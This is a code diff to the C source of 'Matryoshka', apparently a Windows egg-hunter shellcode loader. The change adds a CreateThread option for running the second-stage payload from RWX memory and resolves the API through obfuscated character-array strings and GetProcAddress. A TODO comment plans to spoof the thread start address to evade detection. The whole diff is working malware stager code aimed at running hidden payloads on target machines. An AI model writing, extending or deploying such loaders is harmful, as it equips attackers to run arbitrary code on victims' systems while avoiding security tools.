@@ -27,7 +27,7 @@
 BOOL MatryoshkaEntrypoint(matryoshka_loader_config_t* config);
 matryoshka_egg_t* MatryoshkaHunter(matryoshka_loader_config_t* config, matryoshka_state* state);
 BOOL MatryoshkaInitRuntime(matryoshka_state* state);
-BOOL MatryoshkaRunStage(matryoshka_state* state, matryoshka_egg_t* egg);
+BOOL MatryoshkaRunStage(matryoshka_loader_config_t* config, matryoshka_state* state, matryoshka_egg_t* egg);
 
 #ifdef _DEBUG 
 BYTE egg_test[] = { 
@@ -56,7 +56,9 @@ int main() {
 	config.egg_pattern[4]  = 0xAB;
 	config.egg_pattern[5]  = 0x1C;
 	config.egg_pattern[6]  = 0x81;
-	config.egg_pattern[7]  = 0x9D;
+	config.egg_pattern[7]  = 0x9C;
+
+	config.flags.spawn_new_thread = 0;
 
 	debug("[i] Egg_Test Address Is %p\n", egg_test);
 	MatryoshkaEntrypoint(&config);
@@ -90,7 +92,7 @@ BOOL MatryoshkaEntrypoint(
 		return FALSE;
 	}
 	
-	success = MatryoshkaRunStage(&state, egg);
+	success = MatryoshkaRunStage(config, &state, egg);
 	if (success == FALSE) {
 		debug("[-] Error unable to execute payload\n");
 		return FALSE;
@@ -103,6 +105,7 @@ BOOL MatryoshkaEntrypoint(
  * @brief Execute the stager
  */
 BOOL MatryoshkaRunStage(
+	matryoshka_loader_config_t* config,
 	matryoshka_state* state,
 	matryoshka_egg_t* egg
 )
@@ -119,7 +122,26 @@ BOOL MatryoshkaRunStage(
 
 	crt_memcpy(rwx, egg->stage, egg->egg_size);
 
-	((void(*)())rwx)();
+	if (config->flags.spawn_new_thread) {
+		debug("[i] Spawning a thread to run stager");
+		// TODO: Spoof thread start address so it doesn't point to 
+		//       executable heap memory
+		HANDLE hThread = state->runtime.CreateThread(NULL,
+			0,
+			(LPTHREAD_START_ROUTINE)rwx,
+			NULL,
+			0,
+			0);
+
+		if (hThread == NULL) {
+			debug("[-] CreateThread Failed");
+			return FALSE;
+		}
+	}
+	else {
+		debug("[i] Executing the second stage payload using the current thread");
+		((void(*)())rwx)();
+	}
 
 	return TRUE;
 }
@@ -191,6 +213,7 @@ BOOL MatryoshkaInitRuntime(
 	char LoadLibraryStr[]    = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
 
 	char Kernel32Str[]     = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
+	char CreateThreadStr[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0' };
 	char VirtualAllocStr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
 	char VirtualQueryStr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', '\0' };
 	char IsBadReadPtrStr[] = { 'I', 's', 'B', 'a', 'd', 'R', 'e', 'a', 'd', 'P', 't', 'r', '\0' };
@@ -230,6 +253,12 @@ BOOL MatryoshkaInitRuntime(
 		return FALSE;
 	}
 
+	state->runtime.CreateThread = state->runtime.GetProcAddress(kernel32, CreateThreadStr);
+	if (state->runtime.CreateThread == NULL) {
+		debug("[-] Unable to resolve address of CreateThread\n");
+		return FALSE;
+	}
+
 	state->runtime.IsBadReadPtr = state->runtime.GetProcAddress(kernel32, IsBadReadPtrStr);
 	if (state->runtime.IsBadReadPtr == NULL) {
 		debug("[-] Unable to resolve address of IsBadReadPtr\n");
@@ -238,7 +267,7 @@ BOOL MatryoshkaInitRuntime(
 
 	state->runtime.VirtualAlloc = state->runtime.GetProcAddress(kernel32, VirtualAllocStr);
 	if (state->runtime.VirtualAlloc == NULL) {
-		debug("[-] Unable to resolve address of VirtualQuery\n");
+		debug("[-] Unable to resolve address of VirtualAlloc\n");
 		return FALSE;
 	}
 
